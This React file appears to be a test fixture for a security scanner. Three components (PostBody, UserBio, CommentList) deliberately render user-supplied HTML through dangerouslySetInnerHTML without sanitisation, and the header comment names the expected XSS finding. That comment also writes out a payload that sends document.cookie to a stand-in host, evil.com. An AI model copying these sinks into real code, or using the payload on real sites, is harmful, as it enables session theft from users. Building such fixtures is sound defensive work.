// Vulnerable React component: dangerouslySetInnerHTML with user-controlled HTML.
//
// Trust boundary: post.content and user.bio originate from API/prop input and
// are rendered verbatim — React's auto-escape is disabled at this site. An
// attacker stores <script>fetch('//evil.com?'+document.cookie)</script> in
// their bio and the response renders it inline.
//
// Expected finding: xss_or_code_exec (high), CWE-79, A03:2021.

import React from 'react';

export function PostBody({ post }) {
  // Vulnerable: post.content is rendered as raw HTML. The canonical React XSS
  // sink. No DOMPurify / sanitize-html wrapper.
  return <div dangerouslySetInnerHTML={{ __html: post.content }} />;
}

export function UserBio({ user }) {
  // Vulnerable: same shape; user.bio is attacker-controlled.
  return (
    <section className="bio">
      <h2>{user.name}</h2>
      <div dangerouslySetInnerHTML={{ __html: user.bio }} />
    </section>
  );
}

export function CommentList({ comments }) {
  // Vulnerable: iterates over user comments and renders each as raw HTML.
  return (
    <ul>
      {comments.map((c) => (
        <li key={c.id} dangerouslySetInnerHTML={{ __html: c.body }} />
      ))}
    </ul>
  );
}
